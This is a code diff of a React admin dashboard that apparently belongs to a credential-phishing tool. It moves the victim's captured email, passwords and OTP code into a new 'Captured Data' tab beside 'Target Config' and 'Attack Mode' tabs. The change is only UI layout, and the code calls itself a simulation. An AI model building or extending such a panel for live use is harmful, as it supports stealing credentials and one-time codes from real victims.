@@ -1,3 +1,4 @@
+
 "use client";
 
 import { useState, useEffect, useCallback, ChangeEvent } from "react";
@@ -206,8 +207,9 @@ export function AdminDashboard() {
   return (
     <div className="w-full max-w-4xl mx-auto">
         <Tabs defaultValue="live" className="w-full">
-            <TabsList className="grid w-full grid-cols-3">
+            <TabsList className="grid w-full grid-cols-4">
                 <TabsTrigger value="live">Live Dashboard</TabsTrigger>
+                <TabsTrigger value="data">Captured Data</TabsTrigger>
                 <TabsTrigger value="config">Target Config</TabsTrigger>
                 <TabsTrigger value="attackMode">Attack Mode</TabsTrigger>
             </TabsList>
@@ -308,32 +310,38 @@ export function AdminDashboard() {
                             </Button>
                         </div>
                     </div>
-                    <Separator />
-                    <div>
-                      <h3 className="font-semibold mb-2">Captured Data</h3>
-                      <div className="space-y-4">
-                        <div className="p-4 bg-muted rounded-lg">
-                          <div className="font-mono text-sm">
-                            <strong>Email:</strong> {state?.victim.email || "---"}
-                          </div>
+                  </CardContent>
+                </Card>
+            </TabsContent>
+            <TabsContent value="data">
+              <Card>
+                  <CardHeader>
+                    <CardTitle>Captured Data</CardTitle>
+                    <CardDescription>All data captured from the victim during the simulation.</CardDescription>
+                  </CardHeader>
+                  <CardContent>
+                    <div className="space-y-4">
+                      <div className="p-4 bg-muted rounded-lg">
+                        <div className="font-mono text-sm">
+                          <strong>Email:</strong> {state?.victim.email || "---"}
                         </div>
-                        <div className="p-4 bg-muted rounded-lg space-y-2">
-                          <div className="font-mono text-sm"><strong>Passwords:</strong></div>
-                          {state?.victim.passwords && Object.values(state.victim.passwords).length > 0 ? (
-                            <ul className="list-disc list-inside space-y-1">
-                              {Object.values(state.victim.passwords).map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
-                            </ul>
-                          ) : <div className="font-mono text-sm">---</div>}
-                        </div>
-                         <div className="p-4 bg-muted rounded-lg">
-                          <div className="font-mono text-sm">
-                            <strong>OTP:</strong> {state?.victim.otp || "---"}
-                          </div>
+                      </div>
+                      <div className="p-4 bg-muted rounded-lg space-y-2">
+                        <div className="font-mono text-sm"><strong>Passwords:</strong></div>
+                        {state?.victim.passwords && Object.values(state.victim.passwords).length > 0 ? (
+                          <ul className="list-disc list-inside space-y-1">
+                            {Object.values(state.victim.passwords).map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
+                          </ul>
+                        ) : <div className="font-mono text-sm">---</div>}
+                      </div>
+                       <div className="p-4 bg-muted rounded-lg">
+                        <div className="font-mono text-sm">
+                          <strong>OTP:</strong> {state?.victim.otp || "---"}
                         </div>
                       </div>
                     </div>
                   </CardContent>
-                </Card>
+              </Card>
             </TabsContent>
             <TabsContent value="config">
                 <Card>
